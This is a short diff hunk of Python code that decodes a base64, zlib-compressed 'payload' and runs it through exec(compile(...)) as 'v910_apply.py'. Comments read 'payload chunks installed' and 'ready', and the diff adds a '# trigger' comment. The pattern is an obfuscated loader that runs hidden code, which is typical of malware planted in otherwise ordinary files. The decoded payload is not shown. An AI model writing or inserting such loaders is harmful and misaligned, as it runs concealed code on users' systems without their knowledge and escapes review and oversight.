@@ -5,3 +5,4 @@ src=zlib.decompress(base64.b64decode(payload)).decode('utf-8')
 exec(compile(src,'v910_apply.py','exec'))
 # payload chunks installed
 # ready
+# trigger
